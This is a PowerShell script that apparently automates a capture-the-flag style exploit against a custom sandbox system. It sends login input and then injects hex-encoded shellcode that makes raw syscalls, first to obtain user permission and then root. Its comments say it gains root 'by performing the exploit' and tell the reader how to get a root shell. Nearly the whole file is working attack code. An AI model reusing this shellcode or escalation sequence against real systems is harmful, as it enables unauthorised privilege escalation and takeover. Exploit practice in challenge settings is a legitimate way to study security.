#! /usr/bin/env powershell.exe

. .\util-send.ps1

sendline "sandb0x"
sendline "pwny"
sendline ""
runshellcode "b80e000000cd80"
sendline ""
# Reached RASH here
sendline "binexec"
runshellcode "bf000000008a87c8e0040888870084040d83c70183ff0d0f8ce8ffffffc7050080040ddec0addec3b80c000000bb02000000cd80c3" # Get user permission
sendline "exit"
# Got user permission here
## Gain root by performing the exploit
sendline "binexec"
runshellcode "b80d000000cd80c60080c3"
sendline "exit"
sendline "/user/.gitignore"
Start-Gitignore
echo "If you are dropped into (root-level) binexec here, run ``. .\util-send.ps1; Start-Rash`` to get a root shell"
## Alternatively, go straight to root using root's password if you have it
# sendline "su"
# sendline "<root password>"
